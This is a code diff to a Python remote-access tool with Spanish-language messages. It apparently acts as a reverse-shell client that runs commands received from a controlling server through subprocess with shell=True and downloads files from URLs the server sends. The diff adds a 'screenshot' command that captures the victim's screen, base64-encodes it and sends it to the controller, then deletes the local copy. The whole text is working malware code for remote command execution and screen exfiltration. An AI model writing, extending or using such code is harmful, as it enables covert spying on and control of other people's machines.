@@ -6,13 +6,18 @@ import os
 import subprocess
 import base64
 import requests
+import mss
+
+def captura_pantalla():
+    screen = mss.mss()
+    screen.shot()
 
 def donwload_file(url):
     consulta = requests.get(url)
     name_file = url.split("/")[-1]
     with open(name_file, 'wb') as file_get:
         file_get.write(consulta.content)
-        
+
 def shell():
     current_dir = os.getcwd()
     cliente.send(current_dir)
@@ -39,7 +44,17 @@ def shell():
                 donwload_file(res[4:])
                 cliente.send("Archivo descargado Correctamente :)")
             except:
-                cliente.send("Ocurrio un error en la descarga :( )")        
+                cliente.send("Ocurrio un error en la descarga :(")  
+
+        elif res[:10] == "screenshot":
+            try:
+                captura_pantalla()
+                with open('monitor-1.png','rb') as file_send:
+                    cliente.send(base64.b64encode(file_send.read()))
+                os.remove("monitor-1.png")
+            except:
+                cliente.send(base64.b64encode("fail"))
+
         else:
             proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
